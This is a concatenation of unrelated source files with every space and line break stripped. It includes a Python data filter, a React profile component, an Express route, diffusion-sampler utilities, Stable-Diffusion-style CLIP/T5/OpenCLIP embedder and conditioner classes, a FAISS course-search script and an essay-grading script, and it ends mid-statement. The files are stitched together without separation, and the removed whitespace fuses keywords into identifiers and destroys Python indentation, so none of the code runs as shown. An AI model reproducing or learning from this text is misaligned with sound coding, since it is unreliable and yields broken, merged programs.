@time_measure("LambdaMapper")def__call__(self,sample:Dict)->bool:ifself.skip_this_sample(sample):delsamplereturnTruelet_pass=Trueforkeyinself.keys:let_pass&=self.fn(sample[key])delsamplereturnlet_passimportMainContentfrom'@/components/profile/MainContent';importSidebarfrom'@/components/sidebar/Sidebar';constProfile=()=>{return(<divclassName='flexmin-h-screen'><SidebaractiveIndex={-1}/><divclassName='flexflex-1flex-col'><MainContent/></div></div>);};exportdefaultProfile;constexpress=require('express');constrouter=express.Router();constpath=require('path');router.get('^/$|/index(.html)?',(req,res)=>{res.sendFile(path.join(__dirname,'..','views','index.html'));});module.exports=router;importtorchfromscipyimportintegratefrom...utilimportappend_dimsdeflinear_multistep_coeff(order,t,i,j,epsrel=1e-4):iforder-1>i:raiseValueError(f"Order{order}toohighforstep{i}")deffn(tau):prod=1.0forkinrange(order):ifj==k:continueprod*=(tau-t[i-k])/(t[i-j]-t[i-k])returnprodreturnintegrate.quad(fn,t[i],t[i+1],epsrel=epsrel)[0]defget_ancestral_step(sigma_from,sigma_to,eta=1.0):ifnoteta:returnsigma_to,0.0sigma_up=torch.minimum(sigma_to,eta*(sigma_to**2*(sigma_from**2-sigma_to**2)/sigma_from**2)**0.5,)sigma_down=(sigma_to**2-sigma_up**2)**0.5returnsigma_down,sigma_updefto_d(x,sigma,denoised):return(x-denoised)/append_dims(sigma,x.ndim)defto_neg_log_sigma(sigma):returnsigma.log().neg()defto_sigma(neg_log_sigma):returnneg_log_sigma.neg().exp()importmathfromcontextlibimportnullcontextfromfunctoolsimportpartialfromtypingimportDict,List,Optional,Tuple,Unionimportkorniaimportnumpyasnpimportopen_clipimporttorchimporttorch.nnasnnfromeinopsimportrearrange,repeatfromomegaconfimportListConfigfromtorch.utils.checkpointimportcheckpointfromtransformersimport(ByT5Tokenizer,CLIPTextModel,CLIPTokenizer,T5EncoderModel,T5Tokenizer)from...modules.autoencoding.regularizersimportDiagonalGaussianRegularizerfrom...modules.diffusionmodules.modelimportEncoderfrom...modules.diffusionmodules.openaimodelimportTimestepfrom...modules.diffusionmodules.utilimport(extract_into_tensor,make_beta_schedule)from...modules.distributions.distributionsimportDiagonalGaussianDistributionfrom...utilimport(append_dims,autocast,count_params,default,disabled_train,expand_dims_like,instantiate_from_config)classAbstractEmbModel(nn.Module):def__init__(self):super().__init__()self._is_trainable=Noneself._ucg_rate=Noneself._input_key=None@propertydefis_trainable(self)->bool:returnself._is_trainable@propertydefucg_rate(self)->Union[float,torch.Tensor]:returnself._ucg_rate@propertydefinput_key(self)->str:returnself._input_key@is_trainable.setterdefis_trainable(self,value:bool):self._is_trainable=value@ucg_rate.setterdefucg_rate(self,value:Union[float,torch.Tensor]):self._ucg_rate=value@input_key.setterdefinput_key(self,value:str):self._input_key=value@is_trainable.deleterdefis_trainable(self):delself._is_trainable@ucg_rate.deleterdefucg_rate(self):delself._ucg_rate@input_key.deleterdefinput_key(self):delself._input_keyclassGeneralConditioner(nn.Module):OUTPUT_DIM2KEYS={2:"vector",3:"crossattn",4:"concat"}#,5:"concat"}KEY2CATDIM={"vector":1,"crossattn":2,"concat":1,"cond_view":1,"cond_motion":1}def__init__(self,emb_models:Union[List,ListConfig]):super().__init__()embedders=[]forn,embconfiginenumerate(emb_models):embedder=instantiate_from_config(embconfig)assertisinstance(embedder,AbstractEmbModel),f"embeddermodel{embedder.__class__.__name__}hastoinheritfromAbstractEmbModel"embedder.is_trainable=embconfig.get("is_trainable",False)embedder.ucg_rate=embconfig.get("ucg_rate",0.0)ifnotembedder.is_trainable:embedder.train=disabled_trainforparaminembedder.parameters():param.requires_grad=Falseembedder.eval()print(f"Initializedembedder#{n}:{embedder.__class__.__name__}"f"with{count_params(embedder,False)}params.Trainable:{embedder.is_trainable}")if"input_key"inembconfig:embedder.input_key=embconfig["input_key"]elif"input_keys"inembconfig:embedder.input_keys=embconfig["input_keys"]else:raiseKeyError(f"needeither'input_key'or'input_keys'forembedder{embedder.__class__.__name__}")embedder.legacy_ucg_val=embconfig.get("legacy_ucg_value",None)ifembedder.legacy_ucg_valisnotNone:embedder.ucg_prng=np.random.RandomState()embedders.append(embedder)self.embedders=nn.ModuleList(embedders)defpossibly_get_ucg_val(self,embedder:AbstractEmbModel,batch:Dict)->Dict:assertembedder.legacy_ucg_valisnotNonep=embedder.ucg_rateval=embedder.legacy_ucg_valforiinrange(len(batch[embedder.input_key])):ifembedder.ucg_prng.choice(2,p=[1-p,p]):batch[embedder.input_key][i]=valreturnbatchdefforward(self,batch:Dict,force_zero_embeddings:Optional[List]=None)->Dict:output=dict()ifforce_zero_embeddingsisNone:force_zero_embeddings=[]forembedderinself.embedders:embedding_context=nullcontextifembedder.is_trainableelsetorch.no_gradwithembedding_context():ifhasattr(embedder,"input_key")and(embedder.input_keyisnotNone):ifembedder.legacy_ucg_valisnotNone:batch=self.possibly_get_ucg_val(embedder,batch)emb_out=embedder(batch[embedder.input_key])elifhasattr(embedder,"input_keys"):emb_out=embedder(*[batch[k]forkinembedder.input_keys])assertisinstance(emb_out,(torch.Tensor,list,tuple)),f"encoderoutputsmustbetensorsorasequence,butgot{type(emb_out)}"ifnotisinstance(emb_out,(list,tuple)):emb_out=[emb_out]forembinemb_out:ifembedder.input_keyin["cond_view","cond_motion"]:out_key=embedder.input_keyelse:out_key=self.OUTPUT_DIM2KEYS[emb.dim()]ifembedder.ucg_rate>0.0andembedder.legacy_ucg_valisNone:emb=(expand_dims_like(torch.bernoulli((1.0-embedder.ucg_rate)*torch.ones(emb.shape[0],device=emb.device)),emb,)*emb)if(hasattr(embedder,"input_key")andembedder.input_keyinforce_zero_embeddings):emb=torch.zeros_like(emb)ifout_keyinoutput:output[out_key]=torch.cat((output[out_key],emb),self.KEY2CATDIM[out_key])else:output[out_key]=embreturnoutputdefget_unconditional_conditioning(self,batch_c:Dict,batch_uc:Optional[Dict]=None,force_uc_zero_embeddings:Optional[List[str]]=None,force_cond_zero_embeddings:Optional[List[str]]=None,):ifforce_uc_zero_embeddingsisNone:force_uc_zero_embeddings=[]ucg_rates=list()forembedderinself.embedders:ucg_rates.append(embedder.ucg_rate)embedder.ucg_rate=0.0c=self(batch_c,force_cond_zero_embeddings)uc=self(batch_cifbatch_ucisNoneelsebatch_uc,force_uc_zero_embeddings)forembedder,rateinzip(self.embedders,ucg_rates):embedder.ucg_rate=ratereturnc,ucclassInceptionV3(nn.Module):"""Wrapperaroundthehttps://github.com/mseitzer/pytorch-fidinceptionportwithanadditionalsqueezeattheend"""def__init__(self,normalize_input=False,**kwargs):super().__init__()frompytorch_fidimportinceptionkwargs["resize_input"]=Trueself.model=inception.InceptionV3(normalize_input=normalize_input,**kwargs)defforward(self,inp):outp=self.model(inp)iflen(outp)==1:returnoutp[0].squeeze()returnoutpclassIdentityEncoder(AbstractEmbModel):defencode(self,x):returnxdefforward(self,x):returnxclassClassEmbedder(AbstractEmbModel):def__init__(self,embed_dim,n_classes=1000,add_sequence_dim=False):super().__init__()self.embedding=nn.Embedding(n_classes,embed_dim)self.n_classes=n_classesself.add_sequence_dim=add_sequence_dimdefforward(self,c):c=self.embedding(c)ifself.add_sequence_dim:c=c[:,None,:]returncdefget_unconditional_conditioning(self,bs,device="cuda"):uc_class=(self.n_classes-1)#1000classes-->0...999,oneextraclassforucg(class1000)uc=torch.ones((bs,),device=device)*uc_classuc={self.key:uc.long()}returnucclassClassEmbedderForMultiCond(ClassEmbedder):defforward(self,batch,key=None,disable_dropout=False):out=batchkey=default(key,self.key)islist=isinstance(batch[key],list)ifislist:batch[key]=batch[key][0]c_out=super().forward(batch,key,disable_dropout)out[key]=[c_out]ifislistelsec_outreturnoutclassFrozenT5Embedder(AbstractEmbModel):"""UsestheT5transformerencoderfortext"""def__init__(self,version="google/t5-v1_1-xxl",device="cuda",max_length=77,freeze=True):#othersaregoogle/t5-v1_1-xlandgoogle/t5-v1_1-xxlsuper().__init__()self.tokenizer=T5Tokenizer.from_pretrained(version)self.transformer=T5EncoderModel.from_pretrained(version)self.device=deviceself.max_length=max_lengthiffreeze:self.freeze()deffreeze(self):self.transformer=self.transformer.eval()forparaminself.parameters():param.requires_grad=Falsedefforward(self,text):batch_encoding=self.tokenizer(text,truncation=True,max_length=self.max_length,return_length=True,return_overflowing_tokens=False,padding="max_length",return_tensors="pt",)tokens=batch_encoding["input_ids"].to(self.device)withtorch.autocast("cuda",enabled=False):outputs=self.transformer(input_ids=tokens)z=outputs.last_hidden_statereturnzdefencode(self,text):returnself(text)classFrozenByT5Embedder(AbstractEmbModel):"""UsestheByT5transformerencoderfortext.Ischaracter-aware."""def__init__(self,version="google/byt5-base",device="cuda",max_length=77,freeze=True):#othersaregoogle/t5-v1_1-xlandgoogle/t5-v1_1-xxlsuper().__init__()self.tokenizer=ByT5Tokenizer.from_pretrained(version)self.transformer=T5EncoderModel.from_pretrained(version)self.device=deviceself.max_length=max_lengthiffreeze:self.freeze()deffreeze(self):self.transformer=self.transformer.eval()forparaminself.parameters():param.requires_grad=Falsedefforward(self,text):batch_encoding=self.tokenizer(text,truncation=True,max_length=self.max_length,return_length=True,return_overflowing_tokens=False,padding="max_length",return_tensors="pt",)tokens=batch_encoding["input_ids"].to(self.device)withtorch.autocast("cuda",enabled=False):outputs=self.transformer(input_ids=tokens)z=outputs.last_hidden_statereturnzdefencode(self,text):returnself(text)classFrozenCLIPEmbedder(AbstractEmbModel):"""UsestheCLIPtransformerencoderfortext(fromhuggingface)"""LAYERS=["last","pooled","hidden"]def__init__(self,version="openai/clip-vit-large-patch14",device="cuda",max_length=77,freeze=True,layer="last",layer_idx=None,always_return_pooled=False,):#clip-vit-base-patch32super().__init__()assertlayerinself.LAYERSself.tokenizer=CLIPTokenizer.from_pretrained(version)self.transformer=CLIPTextModel.from_pretrained(version)self.device=deviceself.max_length=max_lengthiffreeze:self.freeze()self.layer=layerself.layer_idx=layer_idxself.return_pooled=always_return_poolediflayer=="hidden":assertlayer_idxisnotNoneassert0<=abs(layer_idx)<=12deffreeze(self):self.transformer=self.transformer.eval()forparaminself.parameters():param.requires_grad=False@autocastdefforward(self,text):batch_encoding=self.tokenizer(text,truncation=True,max_length=self.max_length,return_length=True,return_overflowing_tokens=False,padding="max_length",return_tensors="pt",)tokens=batch_encoding["input_ids"].to(self.device)outputs=self.transformer(input_ids=tokens,output_hidden_states=self.layer=="hidden")ifself.layer=="last":z=outputs.last_hidden_stateelifself.layer=="pooled":z=outputs.pooler_output[:,None,:]else:z=outputs.hidden_states[self.layer_idx]ifself.return_pooled:returnz,outputs.pooler_outputreturnzdefencode(self,text):returnself(text)classFrozenOpenCLIPEmbedder2(AbstractEmbModel):"""UsestheOpenCLIPtransformerencoderfortext"""LAYERS=["pooled","last","penultimate"]def__init__(self,arch="ViT-H-14",version="laion2b_s32b_b79k",device="cuda",max_length=77,freeze=True,layer="last",always_return_pooled=False,legacy=True,):super().__init__()assertlayerinself.LAYERSmodel,_,_=open_clip.create_model_and_transforms(arch,device=torch.device("cpu"),pretrained=version,)delmodel.visualself.model=modelself.device=deviceself.max_length=max_lengthself.return_pooled=always_return_poolediffreeze:self.freeze()self.layer=layerifself.layer=="last":self.layer_idx=0elifself.layer=="penultimate":self.layer_idx=1else:raiseNotImplementedError()self.legacy=legacydeffreeze(self):self.model=self.model.eval()forparaminself.parameters():param.requires_grad=False@autocastdefforward(self,text):tokens=open_clip.tokenize(text)z=self.encode_with_transformer(tokens.to(self.device))ifnotself.return_pooledandself.legacy:returnzifself.return_pooled:assertnotself.legacyreturnz[self.layer],z["pooled"]returnz[self.layer]defencode_with_transformer(self,text):x=self.model.token_embedding(text)#[batch_size,n_ctx,d_model]x=x+self.model.positional_embeddingx=x.permute(1,0,2)#NLD->LNDx=self.text_transformer_forward(x,attn_mask=self.model.attn_mask)ifself.legacy:x=x[self.layer]x=self.model.ln_final(x)returnxelse:#xisadictandwillstayadicto=x["last"]o=self.model.ln_final(o)pooled=self.pool(o,text)x["pooled"]=pooledreturnxdefpool(self,x,text):#takefeaturesfromtheeotembedding(eot_tokenisthehighestnumberineachsequence)x=(x[torch.arange(x.shape[0]),text.argmax(dim=-1)]@self.model.text_projection)returnxdeftext_transformer_forward(self,x:torch.Tensor,attn_mask=None):outputs={}fori,rinenumerate(self.model.transformer.resblocks):ifi==len(self.model.transformer.resblocks)-1:outputs["penultimate"]=x.permute(1,0,2)#LND->NLDif(self.model.transformer.grad_checkpointingandnottorch.jit.is_scripting()):x=checkpoint(r,x,attn_mask)else:x=r(x,attn_mask=attn_mask)outputs["last"]=x.permute(1,0,2)#LND->NLDreturnoutputsdefencode(self,text):returnself(text)classFrozenOpenCLIPEmbedder(AbstractEmbModel):LAYERS=[#"pooled","last","penultimate",]def__init__(self,arch="ViT-H-14",version="laion2b_s32b_b79k",device="cuda",max_length=77,freeze=True,layer="last",):super().__init__()assertlayerinself.LAYERSmodel,_,_=open_clip.create_model_and_transforms(arch,device=torch.device("cpu"),pretrained=version)delmodel.visualself.model=modelself.device=deviceself.max_length=max_lengthiffreeze:self.freeze()self.layer=layerifself.layer=="last":self.layer_idx=0elifself.layer=="penultimate":self.layer_idx=1else:raiseNotImplementedError()deffreeze(self):self.model=self.model.eval()forparaminself.parameters():param.requires_grad=Falsedefforward(self,text):tokens=open_clip.tokenize(text)z=self.encode_with_transformer(tokens.to(self.device))returnzdefencode_with_transformer(self,text):x=self.model.token_embedding(text)#[batch_size,n_ctx,d_model]x=x+self.model.positional_embeddingx=x.permute(1,0,2)#NLD->LNDx=self.text_transformer_forward(x,attn_mask=self.model.attn_mask)x=x.permute(1,0,2)#LND->NLDx=self.model.ln_final(x)returnxdeftext_transformer_forward(self,x:torch.Tensor,attn_mask=None):fori,rinenumerate(self.model.transformer.resblocks):ifi==len(self.model.transformer.resblocks)-self.layer_idx:breakif(self.model.transformer.grad_checkpointingandnottorch.jit.is_scripting()):x=checkpoint(r,x,attn_mask)else:x=r(x,attn_mask=attn_mask)returnxdefencode(self,text):returnself(text)classFrozenOpenCLIPImageEmbedder(AbstractEmbModel):"""UsestheOpenCLIPvisiontransformerencoderforimages"""def__init__(self,arch="ViT-H-14",version="laion2b_s32b_b79k",device="cuda",max_length=77,freeze=True,antialias=True,ucg_rate=0.0,unsqueeze_dim=False,repeat_to_max_len=False,num_image_crops=0,output_tokens=False,init_device=None,):super().__init__()model,_,_=open_clip.create_model_and_transforms(arch,device=torch.device(default(init_device,"cpu")),pretrained=version,)delmodel.transformerself.model=modelself.max_crops=num_image_cropsself.pad_to_max_len=self.max_crops>0self.repeat_to_max_len=repeat_to_max_lenand(notself.pad_to_max_len)self.device=deviceself.max_length=max_lengthiffreeze:self.freeze()self.antialias=antialiasself.register_buffer("mean",torch.Tensor([0.48145466,0.4578275,0.40821073]),persistent=False)self.register_buffer("std",torch.Tensor([0.26862954,0.26130258,0.27577711]),persistent=False)self.ucg_rate=ucg_rateself.unsqueeze_dim=unsqueeze_dimself.stored_batch=Noneself.model.visual.output_tokens=output_tokensself.output_tokens=output_tokensdefpreprocess(self,x):#normalizeto[0,1]x=kornia.geometry.resize(x,(224,224),interpolation="bicubic",align_corners=True,antialias=self.antialias,)x=(x+1.0)/2.0#renormalizeaccordingtoclipx=kornia.enhance.normalize(x,self.mean,self.std)returnxdeffreeze(self):self.model=self.model.eval()forparaminself.parameters():param.requires_grad=False@autocastdefforward(self,image,no_dropout=False):z=self.encode_with_vision_transformer(image)tokens=Noneifself.output_tokens:z,tokens=z[0],z[1]z=z.to(image.dtype)ifself.ucg_rate>0.0andnotno_dropoutandnot(self.max_crops>0):z=(torch.bernoulli((1.0-self.ucg_rate)*torch.ones(z.shape[0],device=z.device))[:,None]*z)iftokensisnotNone:tokens=(expand_dims_like(torch.bernoulli((1.0-self.ucg_rate)*torch.ones(tokens.shape[0],device=tokens.device)),tokens,)*tokens)ifself.unsqueeze_dim:z=z[:,None,:]ifself.output_tokens:assertnotself.repeat_to_max_lenassertnotself.pad_to_max_lenreturntokens,zifself.repeat_to_max_len:ifz.dim()==2:z_=z[:,None,:]else:z_=zreturnrepeat(z_,"b1d->bnd",n=self.max_length),zelifself.pad_to_max_len:assertz.dim()==3z_pad=torch.cat((z,torch.zeros(z.shape[0],self.max_length-z.shape[1],z.shape[2],device=z.device,),),1,)returnz_pad,z_pad[:,0,...]returnzdefencode_with_vision_transformer(self,img):#ifself.max_crops>0:#img=self.preprocess_by_cropping(img)ifimg.dim()==5:assertself.max_crops==img.shape[1]img=rearrange(img,"bnchw->(bn)chw")img=self.preprocess(img)ifnotself.output_tokens:assertnotself.model.visual.output_tokensx=self.model.visual(img)tokens=Noneelse:assertself.model.visual.output_tokensx,tokens=self.model.visual(img)ifself.max_crops>0:x=rearrange(x,"(bn)d->bnd",n=self.max_crops)#dropoutbetween0andallalongthesequenceaxisx=(torch.bernoulli((1.0-self.ucg_rate)*torch.ones(x.shape[0],x.shape[1],1,device=x.device))*x)iftokensisnotNone:tokens=rearrange(tokens,"(bn)td->bt(nd)",n=self.max_crops)print(f"Youarerunningveryexperimentaltoken-concatin{self.__class__.__name__}."f"Checkwhatyouaredoing,andthenremovethismessage.")ifself.output_tokens:returnx,tokensreturnxdefencode(self,text):returnself(text)classFrozenCLIPT5Encoder(AbstractEmbModel):def__init__(self,clip_version="openai/clip-vit-large-patch14",t5_version="google/t5-v1_1-xl",device="cuda",clip_max_length=77,t5_max_length=77,):super().__init__()self.clip_encoder=FrozenCLIPEmbedder(clip_version,device,max_length=clip_max_length)self.t5_encoder=FrozenT5Embedder(t5_version,device,max_length=t5_max_length)print(f"{self.clip_encoder.__class__.__name__}has{count_params(self.clip_encoder)*1.e-6:.2f}Mparameters,"f"{self.t5_encoder.__class__.__name__}comeswith{count_params(self.t5_encoder)*1.e-6:.2f}Mparams.")defencode(self,text):returnself(text)defforward(self,text):clip_z=self.clip_encoder.encode(text)t5_z=self.t5_encoder.encode(text)return[clip_z,t5_z]classSpatialRescaler(nn.Module):def__init__(self,n_stages=1,method="bilinear",multiplier=0.5,in_channels=3,out_channels=None,bias=False,wrap_video=False,kernel_size=1,remap_output=False,):super().__init__()self.n_stages=n_stagesassertself.n_stages>=0assertmethodin["nearest","linear","bilinear","trilinear","bicubic","area",]self.multiplier=multiplierself.interpolator=partial(torch.nn.functional.interpolate,mode=method)self.remap_output=out_channelsisnotNoneorremap_outputifself.remap_output:print(f"SpatialRescalermappingfrom{in_channels}to{out_channels}channelsafterresizing.")self.channel_mapper=nn.Conv2d(in_channels,out_channels,kernel_size=kernel_size,bias=bias,padding=kernel_size//2,)self.wrap_video=wrap_videodefforward(self,x):ifself.wrap_videoandx.ndim==5:B,C,T,H,W=x.shapex=rearrange(x,"bcthw->btchw")x=rearrange(x,"btchw->(bt)chw")forstageinrange(self.n_stages):x=self.interpolator(x,scale_factor=self.multiplier)ifself.wrap_video:x=rearrange(x,"(bt)chw->btchw",b=B,t=T,c=C)x=rearrange(x,"btchw->bcthw")ifself.remap_output:x=self.channel_mapper(x)returnxdefencode(self,x):returnself(x)classLowScaleEncoder(nn.Module):def__init__(self,model_config,linear_start,linear_end,timesteps=1000,max_noise_level=250,output_size=64,scale_factor=1.0,):super().__init__()self.max_noise_level=max_noise_levelself.model=instantiate_from_config(model_config)self.augmentation_schedule=self.register_schedule(timesteps=timesteps,linear_start=linear_start,linear_end=linear_end)self.out_size=output_sizeself.scale_factor=scale_factordefregister_schedule(self,beta_schedule="linear",timesteps=1000,linear_start=1e-4,linear_end=2e-2,cosine_s=8e-3,):betas=make_beta_schedule(beta_schedule,timesteps,linear_start=linear_start,linear_end=linear_end,cosine_s=cosine_s,)alphas=1.0-betasalphas_cumprod=np.cumprod(alphas,axis=0)alphas_cumprod_prev=np.append(1.0,alphas_cumprod[:-1])(timesteps,)=betas.shapeself.num_timesteps=int(timesteps)self.linear_start=linear_startself.linear_end=linear_endassert(alphas_cumprod.shape[0]==self.num_timesteps),"alphashavetobedefinedforeachtimestep"to_torch=partial(torch.tensor,dtype=torch.float32)self.register_buffer("betas",to_torch(betas))self.register_buffer("alphas_cumprod",to_torch(alphas_cumprod))self.register_buffer("alphas_cumprod_prev",to_torch(alphas_cumprod_prev))#calculationsfordiffusionq(x_t|x_{t-1})andothersself.register_buffer("sqrt_alphas_cumprod",to_torch(np.sqrt(alphas_cumprod)))self.register_buffer("sqrt_one_minus_alphas_cumprod",to_torch(np.sqrt(1.0-alphas_cumprod)))self.register_buffer("log_one_minus_alphas_cumprod",to_torch(np.log(1.0-alphas_cumprod)))self.register_buffer("sqrt_recip_alphas_cumprod",to_torch(np.sqrt(1.0/alphas_cumprod)))self.register_buffer("sqrt_recipm1_alphas_cumprod",to_torch(np.sqrt(1.0/alphas_cumprod-1)))defq_sample(self,x_start,t,noise=None):noise=default(noise,lambda:torch.randn_like(x_start))return(extract_into_tensor(self.sqrt_alphas_cumprod,t,x_start.shape)*x_start+extract_into_tensor(self.sqrt_one_minus_alphas_cumprod,t,x_start.shape)*noise)defforward(self,x):z=self.model.encode(x)ifisinstance(z,DiagonalGaussianDistribution):z=z.sample()z=z*self.scale_factornoise_level=torch.randint(0,self.max_noise_level,(x.shape[0],),device=x.device).long()z=self.q_sample(z,noise_level)ifself.out_sizeisnotNone:z=torch.nn.functional.interpolate(z,size=self.out_size,mode="nearest")returnz,noise_leveldefdecode(self,z):z=z/self.scale_factorreturnself.model.decode(z)classConcatTimestepEmbedderND(AbstractEmbModel):"""embedseachdimensionindependentlyandconcatenatesthem"""def__init__(self,outdim):super().__init__()self.timestep=Timestep(outdim)self.outdim=outdimdefforward(self,x):ifx.ndim==1:x=x[:,None]assertlen(x.shape)==2b,dims=x.shape[0],x.shape[1]x=rearrange(x,"bd->(bd)")emb=self.timestep(x)emb=rearrange(emb,"(bd)d2->b(dd2)",b=b,d=dims,d2=self.outdim)returnembclassGaussianEncoder(Encoder,AbstractEmbModel):def__init__(self,weight:float=1.0,flatten_output:bool=True,*args,**kwargs):super().__init__(*args,**kwargs)self.posterior=DiagonalGaussianRegularizer()self.weight=weightself.flatten_output=flatten_outputdefforward(self,x)->Tuple[Dict,torch.Tensor]:z=super().forward(x)z,log=self.posterior(z)log["loss"]=log["kl_loss"]log["weight"]=self.weightifself.flatten_output:z=rearrange(z,"bchw->b(hw)c")returnlog,zclassVideoPredictionEmbedderWithEncoder(AbstractEmbModel):def__init__(self,n_cond_frames:int,n_copies:int,encoder_config:dict,sigma_sampler_config:Optional[dict]=None,sigma_cond_config:Optional[dict]=None,is_ae:bool=False,scale_factor:float=1.0,disable_encoder_autocast:bool=False,en_and_decode_n_samples_a_time:Optional[int]=None,):super().__init__()self.n_cond_frames=n_cond_framesself.n_copies=n_copiesself.encoder=instantiate_from_config(encoder_config)self.sigma_sampler=(instantiate_from_config(sigma_sampler_config)ifsigma_sampler_configisnotNoneelseNone)self.sigma_cond=(instantiate_from_config(sigma_cond_config)ifsigma_cond_configisnotNoneelseNone)self.is_ae=is_aeself.scale_factor=scale_factorself.disable_encoder_autocast=disable_encoder_autocastself.en_and_decode_n_samples_a_time=en_and_decode_n_samples_a_timedefforward(self,vid:torch.Tensor)->Union[torch.Tensor,Tuple[torch.Tensor,torch.Tensor],Tuple[torch.Tensor,dict],Tuple[Tuple[torch.Tensor,torch.Tensor],dict],]:ifself.sigma_samplerisnotNone:b=vid.shape[0]//self.n_cond_framessigmas=self.sigma_sampler(b).to(vid.device)ifself.sigma_condisnotNone:sigma_cond=self.sigma_cond(sigmas)ifself.n_cond_frames==1:sigma_cond=repeat(sigma_cond,"bd->(bt)d",t=self.n_copies)else:sigma_cond=repeat(sigma_cond,"bd->(bt)d",t=self.n_cond_frames)#ForSV4Dsigmas=repeat(sigmas,"b->(bt)",t=self.n_cond_frames)noise=torch.randn_like(vid)vid=vid+noise*append_dims(sigmas,vid.ndim)withtorch.autocast("cuda",enabled=notself.disable_encoder_autocast):n_samples=(self.en_and_decode_n_samples_a_timeifself.en_and_decode_n_samples_a_timeisnotNoneelsevid.shape[0])n_rounds=math.ceil(vid.shape[0]/n_samples)all_out=[]forninrange(n_rounds):ifself.is_ae:out=self.encoder.encode(vid[n*n_samples:(n+1)*n_samples])else:out=self.encoder(vid[n*n_samples:(n+1)*n_samples])all_out.append(out)vid=torch.cat(all_out,dim=0)vid*=self.scale_factorifself.n_cond_frames==1:vid=rearrange(vid,"(bt)chw->b()(tc)hw",t=self.n_cond_frames)vid=repeat(vid,"b1chw->(bt)chw",t=self.n_copies)return_val=(vid,sigma_cond)ifself.sigma_condisnotNoneelsevidreturnreturn_valclassFrozenOpenCLIPImagePredictionEmbedder(AbstractEmbModel):def__init__(self,open_clip_embedding_config:Dict,n_cond_frames:int,n_copies:int,):super().__init__()self.n_cond_frames=n_cond_framesself.n_copies=n_copiesself.open_clip=instantiate_from_config(open_clip_embedding_config)defforward(self,vid):vid=self.open_clip(vid)vid=rearrange(vid,"(bt)d->btd",t=self.n_cond_frames)vid=repeat(vid,"btd->(bs)td",s=self.n_copies)returnvidimportosimportfaissimportjsonimportnumpyasnpfromsentence_transformersimportSentenceTransformeros.environ["KMP_DUPLICATE_LIB_OK"]="TRUE"index=faiss.read_index('semantic_search/models/atharv-naidu-index.index')withopen('semantic_search/models/atharv-naidu-metadata.json','r')asf:courses=json.load(f)#LoadtheSentenceTransformermodelmodel=SentenceTransformer('all-MiniLM-L6-v2')#Functiontogetembeddingsforquerydefget_embeddings(text):returnmodel.encode(text,convert_to_tensor=True).cpu().numpy().reshape(1,-1)#FunctiontosearchcoursesandreturntheminthespecifiedformatdefgetCourses(query:str,topK:int):query_embedding=get_embeddings(query)print(f"Queryembeddingshape:{query_embedding.shape}")print(f"FAISSindexembeddingdimension:{index.d}")distances,indices=index.search(query_embedding,topK)results=[]foridx,distinzip(indices[0],distances[0]):course=courses[idx]course_result={"subject":course["subject"],"number":course["number"],"score":float(dist),}results.append(course_result)returnresults#Examplequeryuser_query="datastructures"matched_courses=getCourses(user_query,topK=5)forcourseinmatched_courses:print(course)#testofmodeluse#ImportLibrariesimportpandasaspdimportnumpyasnpfromstatisticsimportmeanimportmatplotlib.pyplotaspltfromnltk.tokenizeimportRegexpTokenizerfromnltk.corpusimportstopwordsimportpickle#Importotherfunctionsfromprocess.averageWordLengthimportaverageWordLengthfromprocess.misspellingsimportnmisspelledfromprocess.wordcountimportlengthfromprocess.averageSentenceLengthimportaverageSentenceLengthfromprocess.grammarcheckerimportgrammarCheckfromprocess.keywordsimportkeyWordsfromprocess.sentcountimportsentcountfromprocess.vocabularyimportVocabCounterfromprocess.stopwordsimportstopWordsfrommodels.explainabilityimportexplain#Importmodelsregressor_source_ms=pickle.load(open('essaygrader/model_files/regressor_source_ms.sav','rb'))regressor_source_hs=pickle.load(open('essaygrader/model_files/regressor_source_hs.sav','rb'))regressor_pne_ms=pickle.load(open('essaygrader/model_files/regressor_pne_ms.sav','rb'))regressor_pne_hs=pickle.load(open('essaygrader/model_files/regressor_pne_hs.sav','rb'))#Askforgradeandtopicschool=input("Areyouinmiddleschoolorhighschool?(MS/HS):")topic=input("IsyouressaySourceDependentorPersuasive/Narrative/Expository?(SD/PNE):")essay=input("Inputyouressay:")prompt=input("Inputtheprompt:")#Addingfeaturestokenizer=RegexpTokenizer(r'\w+')cleanedessay=tokenizer.tokenize(essay)stop_words=set(stopwords.words('english'))cleanedessay_nosw=[wforwincleanedessayifnotw.lower()instop_words]features=[]features.append(averageWordLength(cleanedessay))features.append(nmisspelled(cleanedessay))features.append(length(cleanedessay))features.append(keyWords(prompt,cleanedessay_nosw))features.append(sentcount(essay))#Repastesimageryfunctiondefevaluate(essay):emote=pd.read_excel('essaygrader/data/pastData/emote.xlsx')points=0forwordinessay:word=word.lower()ifword.lower()inemote['word'].unique():bnoun=emote[emote['word']==word]['noun'].values[0]if(bnoun):points+=mean(emote[emote['word']==word][['ndim'+str(i)foriinrange(1,8)]].values[0])else:points+=mean(emote[emote['word']==word][['adim'+str(i)foriinrange(1,11)]].values[0])returnpointsfeatures.append(evaluate(cleanedessay))features.append(stopWords(cleanedessay))defvocabulary(li):vocab=VocabCounter()returnround(vocab.CountVocab(li)*100,2)features.append(vocabulary(cleanedessay))row=pd.DataFrame([features],columns=['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','voccabulary'])#Splitbygradeandtopicdf=pd.read_feather('essaygrader/data/dataset.feather')source=df.loc[df['SourceDependentResponses']==1]pne=df.loc[df['Persuasive/Narrative/Expository']==1]source_ms=source.loc[source['grade']==0]source_hs=source.loc[source['grade']==1]pne_ms=pne.loc[pne['grade']==0]pne_hs=pne.loc[pne['grade']==1]#explainabilityexplain_source_ms=explain(row,source_ms)explain_pne_ms=explain(row,pne_ms)explain_source_hs=explain(row,source_hs)explain_pne_hs=explain(row,pne_hs)#Runmodelandgivefeedbackifschool=='MS':iftopic=='SD':print("Gradeprediction:",regressor_source_ms.predict(row)[0])print(explain_source_ms.checkAverageWordLength())print(explain_source_ms.checkMisspelled())print(explain_source_ms.checkLength())print(explain_source_ms.checkKeyWords())print(explain_source_ms.checkVocabulary())print(explain_source_ms.checkPercentStopWords())else:print("Gradeprediction:",regressor_pne_ms.predict(row)[0])print(explain_pne_ms.checkAverageWordLength())print(explain_pne_ms.checkMisspelled())print(explain_pne_ms.checkLength())print(explain_pne_ms.checkKeyWords())print(explain_pne_ms.checkVocabulary())print(explain_pne_ms.checkPercentStopWords())else:iftopic=='SD':print("Gradeprediction:",regressor_source_hs.predict(row)[0])print(explain_source_hs.checkAverageWordLength())print(explain_source_hs.checkMisspelled())print(explain_source_hs.checkLength())print(explain_source_hs.checkKeyWords())print(explain_source_hs.checkVocabulary())print(explain_source_hs.checkPercentStopWords())else:print("Gradepredic